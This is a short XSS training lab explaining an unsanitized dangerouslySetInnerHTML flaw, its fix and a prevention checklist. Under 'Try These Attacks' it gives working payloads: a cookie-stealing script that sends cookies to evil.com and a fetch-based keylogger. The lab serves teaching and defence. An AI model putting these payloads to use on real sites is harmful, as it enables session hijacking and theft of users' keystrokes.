# Security Lab: XSS Vulnerability

## Learning Objectives
1. Understand how XSS vulnerabilities work
2. Learn to identify vulnerable code patterns
3. Practice implementing secure alternatives
4. Test security measures

## The Vulnerability
The vulnerable component uses `dangerouslySetInnerHTML` without sanitization.
This allows attackers to inject malicious scripts.

## Try These Attacks
1. Basic alert: `<img src=x onerror=alert('XSS')>`
2. Cookie theft: `<script>document.location='http://evil.com?c='+document.cookie</script>`
3. Keylogger: `<script>document.onkeypress=function(e){fetch('/log?key='+e.key)}</script>`

## The Fix
The secure version sanitizes input by encoding HTML entities.
This prevents the browser from interpreting user input as HTML/JavaScript.

## Real-World Impact
- GitHub had an XSS vulnerability in 2020 via issue titles
- PayPal had XSS in their checkout flow in 2019
- These vulnerabilities can lead to account takeover, data theft, and more

## Prevention Checklist
- [ ] Never use dangerouslySetInnerHTML with user input
- [ ] Always sanitize/encode user input
- [ ] Use Content Security Policy headers
- [ ] Implement proper input validation
- [ ] Regular security audits
